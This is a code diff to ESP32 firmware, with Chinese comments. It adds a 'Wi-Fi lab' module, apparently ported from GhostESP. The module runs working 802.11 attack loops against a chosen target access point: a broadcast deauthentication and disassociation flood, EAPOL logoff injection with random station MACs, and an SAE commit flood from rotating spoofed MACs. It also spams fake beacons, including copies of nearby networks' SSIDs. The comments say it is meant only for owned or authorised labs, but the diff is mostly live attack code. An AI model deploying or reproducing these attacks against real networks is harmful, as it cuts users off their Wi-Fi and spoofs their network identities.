@@ -18,6 +18,7 @@
 #include "logic/app_badge.h"
 #include "logic/app_esports.h"
 #include "logic/app_pomodoro.h"
+#include "logic/app_wifilab.h"
 #include "logic/app_qr.h"
 #include "logic/app_time.h"
 #include "logic/app_totp.h"
@@ -116,6 +117,24 @@ static bool s_channel_valid;
 static httpd_handle_t s_httpd;
 static bool s_prov_active;
 static char s_prov_note[80];
+
+// Wi-Fi 实验（仅自有 / 授权环境）：单射频互斥角色
+static bool s_wifilab_running;              // 攻击任务是否在跑（受 s_lock 保护）
+static volatile bool s_wifilab_active;      // 攻击循环退出标志（攻击任务自读）
+static app_wifilab_mode_t s_wifilab_mode;
+static app_wifilab_beacon_t s_wifilab_beacon;
+static uint8_t s_wifilab_bssid[6];          // 目标 AP 的 BSSID（DEAUTH/EAPOL/SAE 用）
+static int s_wifilab_channel;               // 目标信道
+static uint32_t s_wifilab_seed;
+static char s_wifilab_ssid[33];             // 目标 SSID（BEACON_AP_LIST / 展示用）
+static size_t s_wifilab_ssid_len;
+static volatile uint32_t s_wifilab_sent;    // 累计发射帧数（攻击任务自增）
+static bool s_wifilab_was_started;          // 射频是不是本角色借来的（决定停止时是否释放）
+static TaskHandle_t s_wifilab_task;         // 攻击任务句柄
+static esp_err_t s_wifilab_err;             // 最近一次开启结果
+static char s_wifilab_reason[72];           // 失败一句话原因
+static QueueHandle_t s_wifilab_req_q;        // 异步请求队列
+static TaskHandle_t s_wifilab_req_task;
 
 // ---------------------------------------------------------------------------
 // 小工具
@@ -787,6 +806,16 @@ void app_net_channel_scan_request(void)
         s_channel_state = APP_FETCH_FAILED;
         copy_trunc(s_channel_error, sizeof(s_channel_error),
                    "蓝牙正在使用（找设备/万能遥控），请先退出该页再扫描");
+        net_unlock();
+        return;
+    }
+    // 同理：Wi-Fi 实验正在发射时拒绝启动扫描（硬互斥，单一 2.4G 射频）。
+    if (app_net_wifilab_running()) {
+        net_lock();
+        s_channel_running = false;
+        s_channel_state = APP_FETCH_FAILED;
+        copy_trunc(s_channel_error, sizeof(s_channel_error),
+                   "Wi-Fi 实验正在发射，请先退出该页再扫描");
         net_unlock();
         return;
     }
@@ -2761,6 +2790,12 @@ esp_err_t app_net_prov_start(void)
     if (s_prov_active) return ESP_OK;
     if (!s_ap_netif) return ESP_ERR_INVALID_STATE;
 
+    // 射频互斥：Wi-Fi 实验正占着 2.4G 射频，不能叠加配网（配网需要 AP 模式、会改射频）。
+    if (app_net_wifilab_running()) {
+        ESP_LOGW(TAG, "Wi-Fi 实验正在发射，暂不能开启配网");
+        return ESP_ERR_INVALID_STATE;
+    }
+
     log_prov_heap("开启前");
 
     // 记录进来时射频是否已经开着：决定失败时能不能把射频整个关掉。
@@ -2905,6 +2940,337 @@ const char *app_net_prov_note(void)
     bool has = s_prov_note[0] != '\0';
     net_unlock();
     return has ? s_prov_note : NULL;
+}
+
+// ---------------------------------------------------------------------------
+// Wi-Fi 实验（仅自有 / 授权环境：CTF / 实验室无线测试）
+// ---------------------------------------------------------------------------
+// 把 logic/app_wifilab 算好的原始 802.11 帧通过 esp_wifi_80211_tx 发射。本角色与信道体检、
+// 任意蓝牙角色、热点配网共用一路 2.4G 射频，硬互斥（见各 start 的拒绝判断）。start/stop
+// 阻塞式，只由下方常驻 worker 串行调用；界面只发异步请求、读状态。
+//
+// 移植来源：用户自有、公开的 GhostESP（main/managers/wifi_manager.c）。攻击方式、帧字节、
+// 逐信道 / 逐 AP 的发射节奏都按原样复刻，未做"射程 / 隐蔽 / 选靶"上的改动。
+
+static void set_wifilab_reason(const char *text)
+{
+    if (text) snprintf(s_wifilab_reason, sizeof(s_wifilab_reason), "%s", text);
+}
+
+// 攻击循环：根据当前模式把构造好的帧逐包发射，直到 s_wifilab_active 被清。
+static void wifilab_attack_task(void *arg)
+{
+    (void)arg;
+
+    uint8_t frame[256];
+    size_t len = 0;
+    const uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
+
+    switch (s_wifilab_mode) {
+    case APP_WIFILAB_DEAUTH: {
+        uint8_t deauth[26], disassoc[26];
+        while (s_wifilab_active) {
+            if (s_wifilab_channel >= 1 && s_wifilab_channel <= 13) {
+                esp_wifi_set_channel((uint8_t)s_wifilab_channel, WIFI_SECOND_CHAN_NONE);
+            }
+            // 广播去认证 / 去关联（AP -> 站点方向，目的=广播），与 GhostESP 的默认行为一致。
+            app_wifilab_build_deauth(deauth, sizeof(deauth), s_wifilab_bssid, broadcast, 7, &len);
+            esp_wifi_80211_tx(WIFI_IF_AP, deauth, (int)len, false);
+            app_wifilab_build_disassoc(disassoc, sizeof(disassoc), s_wifilab_bssid, broadcast, 7, &len);
+            esp_wifi_80211_tx(WIFI_IF_AP, disassoc, (int)len, false);
+            s_wifilab_sent += 2;
+            vTaskDelay(pdMS_TO_TICKS(5));
+        }
+        break;
+    }
+
+    case APP_WIFILAB_EAPOL_LOGOFF: {
+        // 无已发现站点时退化为随机站点 MAC（与 GhostESP 的 "no stations found" 路径一致）。
+        uint8_t fake_sta[6];
+        app_wifilab_random_mac(fake_sta);
+        while (s_wifilab_active) {
+            if (s_wifilab_channel >= 1 && s_wifilab_channel <= 13) {
+                esp_wifi_set_channel((uint8_t)s_wifilab_channel, WIFI_SECOND_CHAN_NONE);
+            }
+            app_wifilab_build_eapol_logoff(frame, sizeof(frame), s_wifilab_bssid, fake_sta, &len);
+            esp_wifi_80211_tx(WIFI_IF_AP, frame, (int)len, false);
+            s_wifilab_sent++;
+            vTaskDelay(pdMS_TO_TICKS(10));   // eapol_attack_delay_ms 默认 10
+        }
+        break;
+    }
+
+    case APP_WIFILAB_SAE_FLOOD: {
+        uint8_t base[6];
+        if (esp_wifi_get_mac(WIFI_IF_STA, base) != ESP_OK) memset(base, 0, sizeof(base));
+        uint8_t spoof[6];
+        uint16_t fc = 0;
+        while (s_wifilab_active) {
+            if (s_wifilab_channel >= 1 && s_wifilab_channel <= 13) {
+                esp_wifi_set_channel((uint8_t)s_wifilab_channel, WIFI_SECOND_CHAN_NONE);
+            }
+            memcpy(spoof, base, 6);
+            spoof[4] = (uint8_t)((fc >> 8) & 0xFF);
+            spoof[5] = (uint8_t)(fc & 0xFF);
+            app_wifilab_build_sae_commit(frame, sizeof(frame), s_wifilab_bssid, spoof, fc, &len);
+            esp_wifi_80211_tx(WIFI_IF_STA, frame, (int)len, false);
+            s_wifilab_sent++;
+            fc = (uint16_t)((fc + 1) % 65536);
+            vTaskDelay(pdMS_TO_TICKS(10));   // 约 100 帧/秒
+        }
+        break;
+    }
+
+    case APP_WIFILAB_BEACON_SPAM: {
+        int rick_idx = 0;
+        while (s_wifilab_active) {
+            if (s_wifilab_beacon == APP_WIFILAB_BEACON_AP_LIST) {
+                // 把最近一次信道体检扫描到的 AP 的 SSID 逐信道广播（与 GhostESP 的 APLISTMODE 一致）。
+                const app_channel_report_t *r = app_net_channel_report();
+                if (r) {
+                    for (int i = 0; i < r->stored; i++) {
+                        const app_channel_ap_t *ap = &r->aps[i];
+                        int ch = ap->channel;
+                        if (ch < 1 || ch > 13) ch = 1;
+                        esp_wifi_set_channel((uint8_t)ch, WIFI_SECOND_CHAN_NONE);
+                        int sl = 0;
+                        while ((size_t)sl < sizeof(ap->ssid) && ap->ssid[sl] != '\0') sl++;
+                        app_wifilab_build_beacon(frame, sizeof(frame), APP_WIFILAB_BEACON_AP_LIST,
+                                                 ap->ssid, (size_t)sl, ap->bssid, ch, &len);
+                        esp_wifi_80211_tx(WIFI_IF_AP, frame, (int)len, false);
+                        s_wifilab_sent++;
+                        vTaskDelay(pdMS_TO_TICKS(10));
+                        if (!s_wifilab_active) break;
+                    }
+                }
+            } else {
+                // RANDOM / RICKROLL：逐信道 1..11 广播（与 GhostESP wifi_manager_broadcast_ap 一致）。
+                for (int ch = APP_WIFILAB_BEACON_CHANNEL_MIN;
+                     ch <= APP_WIFILAB_BEACON_CHANNEL_MAX; ch++) {
+                    esp_wifi_set_channel((uint8_t)ch, WIFI_SECOND_CHAN_NONE);
+                    if (s_wifilab_beacon == APP_WIFILAB_BEACON_RICKROLL) {
+                        const char *lyric = app_wifilab_rickroll_line(rick_idx++);
+                        app_wifilab_build_beacon(frame, sizeof(frame), APP_WIFILAB_BEACON_RICKROLL,
+                                                 lyric, strlen(lyric), NULL, ch, &len);
+                    } else {
+                        app_wifilab_build_beacon(frame, sizeof(frame), APP_WIFILAB_BEACON_RANDOM,
+                                                 NULL, 0, NULL, ch, &len);
+                    }
+                    esp_wifi_80211_tx(WIFI_IF_AP, frame, (int)len, false);
+                    s_wifilab_sent++;
+                    vTaskDelay(pdMS_TO_TICKS(10));
+                    if (!s_wifilab_active) break;
+                }
+            }
+        }
+        break;
+    }
+
+    default:
+        break;
+    }
+
+    // 任务自然退出（active 被清）后回滚射频由 STOP 请求统一处理；此处不重复释放。
+    s_wifilab_task = NULL;
+    vTaskDelete(NULL);
+}
+
+// 阻塞式启动：先在射频互斥判断里拒绝，再拉起射频并派生攻击任务。须在 worker 中调用。
+static esp_err_t wifilab_start_locked(void)
+{
+    net_lock();
+    if (s_wifilab_running) {
+        net_unlock();
+        return ESP_ERR_INVALID_STATE;
+    }
+    net_unlock();
+
+    // 射频互斥：蓝牙 / 信道体检 / 配网 正占着 2.4G 时直接拒绝（它们也都会反过来拒绝本角色）。
+    if (app_ble_active()) {
+        set_wifilab_reason("蓝牙正在使用（找设备/万能遥控），请先退出该页");
+        return ESP_ERR_INVALID_STATE;
+    }
+    if (app_net_channel_scan_running()) {
+        set_wifilab_reason("信道体检正在扫描 Wi-Fi，请等几秒后重试");
+        return ESP_ERR_INVALID_STATE;
+    }
+    if (app_net_prov_active()) {
+        set_wifilab_reason("热点配网正在使用，请先关闭配网");
+        return ESP_ERR_INVALID_STATE;
+    }
+
+    bool was_started = s_wifi_started;
+    esp_err_t err = wifi_ensure_started();
+    if (err != ESP_OK) {
+        set_wifilab_reason("Wi-Fi 启动失败，请长按↑ 重试");
+        return err;
+    }
+
+    // 发射接口与模式对应：DEAUTH/EAPOL/BEACON 走 AP 接口（需 AP 模式），SAE 走 STA 接口。
+    wifi_mode_t wm = (s_wifilab_mode == APP_WIFILAB_SAE_FLOOD) ? WIFI_MODE_STA : WIFI_MODE_AP;
+    err = esp_wifi_set_mode(wm);
+    if (err != ESP_OK) {
+        if (!was_started && !s_prov_active) app_net_wifi_stop();
+        set_wifilab_reason("Wi-Fi 模式切换失败，请长按↑ 重试");
+        return err;
+    }
+    // 目标信道：DEAUTH/EAPOL/SAE 用目标信道；BEACON 各子模式自行逐信道设置。
+    if (s_wifilab_mode != APP_WIFILAB_BEACON_SPAM &&
+        s_wifilab_channel >= 1 && s_wifilab_channel <= 13) {
+        esp_wifi_set_channel((uint8_t)s_wifilab_channel, WIFI_SECOND_CHAN_NONE);
+    }
+    // 种子 PRNG：调用方未给（0）则用默认种子，保证确定性可复现。
+    app_wifilab_set_seed(s_wifilab_seed ? s_wifilab_seed : 0x1A2B3C4Du);
+
+    s_wifilab_active = true;
+    s_wifilab_sent = 0;
+    s_wifilab_running = true;
+    s_wifilab_was_started = was_started;
+    s_wifilab_err = ESP_OK;
+    s_wifilab_reason[0] = '\0';
+
+    // 栈给足：帧缓冲 256B + 构造器局部 + 逐信道循环的调用深度。与信道体检/配网 worker 一致用 6144，
+    // 避免在 4096 下逼近上限时（尤其 beacon 逐信道路径）发生栈溢出导致的闪退/重启。
+    if (xTaskCreate(wifilab_attack_task, "wifilab", 6144, NULL, 5, &s_wifilab_task) != pdPASS) {
+        s_wifilab_active = false;
+        s_wifilab_running = false;
+        if (!was_started && !s_prov_active) app_net_wifi_stop();
+        set_wifilab_reason("任务创建失败，请稍后重试");
+        return ESP_ERR_NO_MEM;
+    }
+    return ESP_OK;
+}
+
+// 阻塞式停止：清退出标志、删攻击任务，并按需释放本角色借来的射频。须在 worker 中调用。
+static void wifilab_stop_locked(void)
+{
+    s_wifilab_active = false;
+    if (!s_wifilab_running) return;
+    if (s_wifilab_task) {
+        vTaskDelete(s_wifilab_task);   // 攻击任务未持锁，可直接删除（与 GhostESP 的 stop 一致）
+        s_wifilab_task = NULL;
+    }
+    // 只还回去"自己借来的"射频；配网期间更不能关。
+    if (!s_wifilab_was_started && !s_prov_active) app_net_wifi_stop();
+    s_wifilab_running = false;
+}
+
+typedef enum {
+    WIFILAB_REQ_START = 0,
+    WIFILAB_REQ_STOP,
+} wifilab_req_t;
+
+static void wifilab_ctrl_task(void *arg)
+{
+    (void)arg;
+    wifilab_req_t req;
+    while (xQueueReceive(s_wifilab_req_q, &req, portMAX_DELAY) == pdTRUE) {
+        switch (req) {
+        case WIFILAB_REQ_START:
+            s_wifilab_err = wifilab_start_locked();
+            break;
+        case WIFILAB_REQ_STOP:
+            wifilab_stop_locked();
+            s_wifilab_err = ESP_OK;
+            break;
+        }
+    }
+}
+
+static void wifilab_ensure_ctrl(void)
+{
+    if (s_wifilab_req_q) return;
+    s_wifilab_req_q = xQueueCreate(8, sizeof(wifilab_req_t));
+    if (!s_wifilab_req_q) return;
+    if (xTaskCreate(wifilab_ctrl_task, "wifilab_req", 3072, NULL, 5, &s_wifilab_req_task) != pdPASS) {
+        vQueueDelete(s_wifilab_req_q);
+        s_wifilab_req_q = NULL;
+    }
+}
+
+static void wifilab_post(wifilab_req_t req)
+{
+    wifilab_ensure_ctrl();
+    if (s_wifilab_req_q) (void)xQueueSend(s_wifilab_req_q, &req, 0);
+}
+
+// 阻塞式启动接口（如测试 / 内部调用）：先把参数写入模块状态，再走统一启动流程。
+esp_err_t app_net_wifilab_start(app_wifilab_mode_t mode, app_wifilab_beacon_t beacon,
+                                const uint8_t target_bssid[6], int target_channel,
+                                const char *target_ssid, size_t target_ssid_len, uint32_t seed)
+{
+    if (!s_inited) return ESP_ERR_INVALID_STATE;
+    net_lock();
+    s_wifilab_mode = mode;
+    s_wifilab_beacon = beacon;
+    if (target_bssid) memcpy(s_wifilab_bssid, target_bssid, 6);
+    else memset(s_wifilab_bssid, 0, 6);
+    s_wifilab_channel = target_channel;
+    s_wifilab_seed = seed;
+    s_wifilab_ssid_len = (target_ssid_len < sizeof(s_wifilab_ssid) - 1)
+                             ? target_ssid_len : sizeof(s_wifilab_ssid) - 1;
+    if (target_ssid) memcpy(s_wifilab_ssid, target_ssid, s_wifilab_ssid_len);
+    else s_wifilab_ssid[0] = '\0';
+    net_unlock();
+    return wifilab_start_locked();
+}
+
+void app_net_wifilab_stop(void)
+{
+    wifilab_stop_locked();
+}
+
+bool app_net_wifilab_running(void)
+{
+    net_lock();
+    bool r = s_wifilab_running;
+    net_unlock();
+    return r;
+}
+
+void app_net_wifilab_request_start(app_wifilab_mode_t mode, app_wifilab_beacon_t beacon,
+                                   const uint8_t target_bssid[6], int target_channel,
+                                   const char *target_ssid, size_t target_ssid_len, uint32_t seed)
+{
+    if (!s_inited) return;
+    net_lock();
+    s_wifilab_mode = mode;
+    s_wifilab_beacon = beacon;
+    if (target_bssid) memcpy(s_wifilab_bssid, target_bssid, 6);
+    else memset(s_wifilab_bssid, 0, 6);
+    s_wifilab_channel = target_channel;
+    s_wifilab_seed = seed;
+    s_wifilab_ssid_len = (target_ssid_len < sizeof(s_wifilab_ssid) - 1)
+                             ? target_ssid_len : sizeof(s_wifilab_ssid) - 1;
+    if (target_ssid) memcpy(s_wifilab_ssid, target_ssid, s_wifilab_ssid_len);
+    else s_wifilab_ssid[0] = '\0';
+    net_unlock();
+    wifilab_post(WIFILAB_REQ_START);
+}
+
+void app_net_wifilab_request_stop(void)
+{
+    wifilab_post(WIFILAB_REQ_STOP);
+}
+
+esp_err_t app_net_wifilab_last_error(void)
+{
+    return s_wifilab_err;
+}
+
+const char *app_net_wifilab_error_text(void)
+{
+    return s_wifilab_reason[0] ? s_wifilab_reason : NULL;
+}
+
+app_wifilab_mode_t app_net_wifilab_mode(void)
+{
+    return s_wifilab_mode;
+}
+
+uint32_t app_net_wifilab_packets_sent(void)
+{
+    return s_wifilab_sent;
 }
 
 // ---------------------------------------------------------------------------
